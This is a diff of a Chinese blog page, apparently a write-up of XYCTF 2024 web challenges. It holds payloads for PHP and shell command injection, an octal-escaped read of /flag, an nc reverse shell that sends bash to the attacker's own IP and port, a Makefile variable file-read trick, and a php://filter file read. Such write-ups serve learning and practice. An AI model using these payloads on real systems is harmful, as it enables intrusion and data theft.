@@ -24,7 +24,7 @@
 <meta property="og:description" content="WEBezhttp源代码发现：为了防止忘记密码，我把它们放在某个地方了信息泄露：robots.txt发现 Disallow: &#x2F;l0g1n.txt &#x3D;&#x3D;&gt; 得到账号密码不是 yuanshen.com 来的我不要 &#x3D;&#x3D;&gt;Referer: yuanshen.com你用的不是XYCTF的浏览器&#x3D;&#x3D;&gt; User-Age">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-04-14T14:31:07.000Z">
-<meta property="article:modified_time" content="2024-05-02T15:23:50.388Z">
+<meta property="article:modified_time" content="2024-05-02T15:41:41.219Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.4k words
+          2.5k words
         
       </span>
     
@@ -288,7 +288,9 @@
 <h2 id="ez-Make-读文件-文件名过滤"><a href="#ez-Make-读文件-文件名过滤" class="headerlink" title="ez?Make(读文件+文件名过滤)"></a>ez?Make(读文件+文件名过滤)</h2><p>通过shell正则匹配到flag文件,用more读取(大概禁了f,l,a,g ,&#x2F;字符)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cd .. &amp;&amp;cd .. &amp;&amp;cd .. &amp;&amp;more [^e][^b][^b][^b]<br></code></pre></td></tr></table></figure>
 
-<h2 id="εZ-¿м-Kε¿-报错读文件-makefile自动变量"><a href="#εZ-¿м-Kε¿-报错读文件-makefile自动变量" class="headerlink" title="εZ?¿м@Kε¿?(报错读文件+makefile自动变量)"></a>εZ?¿м@Kε¿?(报错读文件+makefile自动变量)</h2><p>Makefile 自动变量<br>在Makefile中，大家经常会见到类似@ 、 @、@、^、$&lt;这种类型的变量。这种变量一般称为自动变量，自动变量是局部变量，作用域范围在当前的规则内，它们分别代表不同的含义：<br>$@：目标<br>$^：所有目标依赖<br>$&lt;：目标依赖列表中的第一个依赖<br>? ：所有目标依赖中被修改过的文件这里第一个依赖是就是 &#x2F; f l a g 注意&#x3D;&#x3D;坑点&#x3D;&#x3D;，之前不要试?：所有目标依赖中被修改过的文件这里第一个依赖是就是&#x2F;flag(注意&#x3D;&#x3D;坑点&#x3D;&#x3D;，之前不要试&gt;，会导致重定向输出创建新文件了，直接影响了后续判断为依赖是FLAG,卡了半天读不到&#x2F;flag)</p>
+<h2 id="εZ-¿м-Kε¿-报错读文件-makefile自动变量"><a href="#εZ-¿м-Kε¿-报错读文件-makefile自动变量" class="headerlink" title="εZ?¿м@Kε¿?(报错读文件+makefile自动变量)"></a>εZ?¿м@Kε¿?(报错读文件+makefile自动变量)</h2><p>Makefile 自动变量<br>在Makefile中，大家经常会见到类似@ 、 @、@、^、$&lt;这种类型的变量。这种变量一般称为自动变量，自动变量是局部变量，作用域范围在当前的规则内，它们分别代表不同的含义：<br>$@：目标<br>$^：所有目标依赖<br>$&lt;：目标依赖列表中的第一个依赖<br>$?：所有目标依赖中被修改过的文件<br>这里第一个依赖是就是 &#x2F;flag<br>(注意&#x3D;&#x3D;坑点&#x3D;&#x3D;，之前不要试$&gt;，会导致重定向输出创建新文件了，直接影响了后续判断为依赖是<br>FLAG,卡了半天读不到&#x2F;flag)</p>
+<p>配合报错带出即可 参照前面ezMake<br>坑点:这里两个 $$ 才代表一个 $</p>
+<p>payload:$$(&lt;$&lt;)</p>
 <h2 id="easymd5-文件比较"><a href="#easymd5-文件比较" class="headerlink" title="easymd5(文件比较)"></a>easymd5(文件比较)</h2><p>将JPG文件甩在工具fastcoll上<br>生成2个文件<br><em>OVER</em></p>
 <h2 id="说英文的复读-机弱密码-SSTI的简单绕过-requests"><a href="#说英文的复读-机弱密码-SSTI的简单绕过-requests" class="headerlink" title="说英文的复读(机弱密码+SSTI的简单绕过(requests))"></a>说英文的复读(机弱密码+SSTI的简单绕过(requests))</h2><p>1.抓包爆破&#x3D;&#x3D;&gt;密码：asdqwe<br>2.fuzz&#x3D;&gt;发现SSTI</p>
 <p>requests,args,.没有过滤</p>
@@ -306,7 +308,9 @@
 <p>没有回显   考虑反弹shell</p>
 <p>首先是这道题的<strong>pyload:?cmd&#x3D;%0a<code>$_GET[1]</code>;%23&amp;1&#x3D;nc</strong> 你的映射的ip地址，你映射的端口 $’\57\142\151\156\57\142\141\163\150’<br>首先我们以pyload，一个一个分析<br>1.前面的get[1]不用多说就是负责绕过长度的嘛，否则也实行不了想要的命令对吧<br>2.后面为什么用nc反弹，而不能用ls，cat这些出信息，首先用的是反引号，得前面加print或者echo什么把信息打印出来（但这里echo被过滤掉了）<br>然后用print的话就无法构造$_GET，所以就nc反弹了，如果不知道什么事nc反弹那得要学一下渗透什么的，那知识点涉及还是有点多的<br>不过就是要用nc肯定没错，既然他无法回显信息，那我只要连接到我攻击机上回显不就行了吗，然后这里就要涉及到内网穿透，就是将自己的攻击机ip地址映射到公网，你可以使用</p>
 <h2 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h2><p>payload:八进制绕过</p>
-<p><strong>?cmd&#x3D;$%27\143\141\164%27&lt;$%27\57\146\154\141\147%27</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>];<br>    <span class="hljs-variable">$cmd_char</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$cmd</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$cmd_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123; <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$char</span>, <span class="hljs-variable">$white_list</span>))&#123; <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;really ez?&quot;</span>); <br>        &#125; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>; <br>&#125; <br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure>
+
+<p>**?cmd&#x3D;$%27\143\141\164%27&lt;$%27\57\146\154\141\147%27**———%27-&gt; ‘</p>
 <p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/03/04/%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4/">https://fushuling.com/index.php/2023/03/04/%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4/</a><br>1.列举了白名单，数字可用，想到八进制（十六进制有字母）<br>2.不能纯八进制绕过，会被当做字符串，没有意义，要用**$’八进制’<strong>包裹<br>3.空格在linux系统里面用八进制是不可以的，</strong>可以替代空格<strong>，就是会转义但是不能执行（比如：会被转义成cat &#x2F;flag，但是不执行）</strong>空格不能用八进制绕过**，正好题目给了&lt;——————–如果不给&lt; 肯定会给别的，就是找替代品<br>4.于是被分成两部分，用&lt;连接</p>
 <h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];  <br><span class="hljs-variable">$aa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];  <br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];  <br><span class="hljs-variable">$bb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];  <br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];  <br>((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br></code></pre></td></tr></table></figure>
 
@@ -337,7 +341,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]);<br><span class="hljs-comment">//其中类名由POST请求中的&#x27;X&#x27;键提供，构造函数的参数由POST请求中的&#x27;Y&#x27;键提供。</span><br></code></pre></td></tr></table></figure>
 
 <p>php原生类读文件 SplFileObject(默认读一行)<br> 所以要结合php伪协议读文件全部内容<br> <strong>X&#x3D;SplFileObject&amp;Y&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong><br>base64解码得flag</p>
-
+<h2 id="ezPop"><a href="#ezPop" class="headerlink" title="ezPop"></a>ezPop</h2>
                 
               </div>
             
